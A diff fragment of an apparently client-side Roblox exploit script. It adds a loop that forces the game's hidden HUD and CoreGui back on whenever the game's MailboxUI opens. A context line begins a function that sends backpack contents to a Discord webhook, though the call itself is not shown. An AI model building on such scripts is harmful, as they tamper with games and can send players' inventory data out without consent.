@@ -60,6 +60,60 @@ if existing then
     if existingFrame then existingFrame.Visible = false end
 end
 
+-- =====================================================================
+-- FORCE GAME HUD VISIBLE
+-- The game hides every player-side ScreenGui (Seeds/Sell/Gear/hotbar)
+-- AND the Roblox CoreGui (jump button, joystick) when MailboxUI opens.
+-- This block keeps them all forced-on so the player keeps full control.
+-- =====================================================================
+local StarterGui = game:GetService("StarterGui")
+
+local HUD_IGNORE = {
+    MailboxUI = true,
+    TouchShieldSystem = true,
+}
+
+local function forceGuiOn(gui)
+    if gui:IsA("ScreenGui") and not HUD_IGNORE[gui.Name] then
+        if not gui.Enabled then
+            pcall(function() gui.Enabled = true end)
+        end
+    end
+end
+
+local function watchGui(gui)
+    if gui:IsA("ScreenGui") and not HUD_IGNORE[gui.Name] then
+        pcall(function()
+            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if not gui.Enabled then
+                    pcall(function() gui.Enabled = true end)
+                end
+            end)
+        end)
+    end
+end
+
+-- Watch every current ScreenGui
+for _, gui in ipairs(playerGui:GetChildren()) do
+    watchGui(gui)
+end
+-- Watch every future ScreenGui added during play
+playerGui.ChildAdded:Connect(watchGui)
+
+-- Force Roblox CoreGui (jump button, chat, backpack, joystick) back on
+-- and re-assert player ScreenGuis every half-second
+task.spawn(function()
+    while true do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        end)
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            forceGuiOn(gui)
+        end
+        task.wait(0.5)
+    end
+end)
+
 -- Send backpack contents to Discord webhook
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
